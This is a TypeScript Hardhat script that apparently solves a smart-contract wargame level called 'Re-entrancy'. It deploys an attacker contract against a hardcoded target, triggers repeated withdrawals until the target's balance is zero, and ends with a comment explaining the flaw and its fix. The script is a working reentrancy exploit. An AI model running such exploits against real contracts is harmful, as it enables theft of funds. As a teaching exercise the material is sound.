import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/10.Re-entrancy/Reentrance.sol/Reentrance.json";
import { Contract } from "ethers";

import { displayResult } from "../../utils/displayResult";

const targetAddress = "0xbeB28938ada664F69C7d7b2109084809191cEB85";

async function main() {
  const [attacker] = await ethers.getSigners();

  const reentrancyAttacker = await deployContract(
    "RentranceAttacker",
    attacker,
    [targetAddress]
  );
  const target = new Contract(targetAddress, abi, attacker);
  await target.donate(reentrancyAttacker.address, {
    value: ethers.utils.parseEther("0.001"),
  });
  const tx = await reentrancyAttacker.attack(ethers.utils.parseEther("0.001"), {
    gasLimit: "3000000",
  });
  await tx.wait();
  const targetBalance = await attacker.provider!.getBalance(targetAddress);
  displayResult(targetBalance.isZero());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation
When the withdraw function is called in the Reentrance contract, the balance of 
the withdrawer is updated after the transfer function is called. Sending Eth to a smart
contract X implies that the smart contract will have to execute code (payable fallback function
or receive function) before the Eth is sent to the contract.
During this the smart contract can call the withdraw function again and again, until the funds are gone.
You should always updatet the balance of the withdrawer before the transfer function is called.
ReEntrancy can take other forms, such as read reentrancy. 
*/
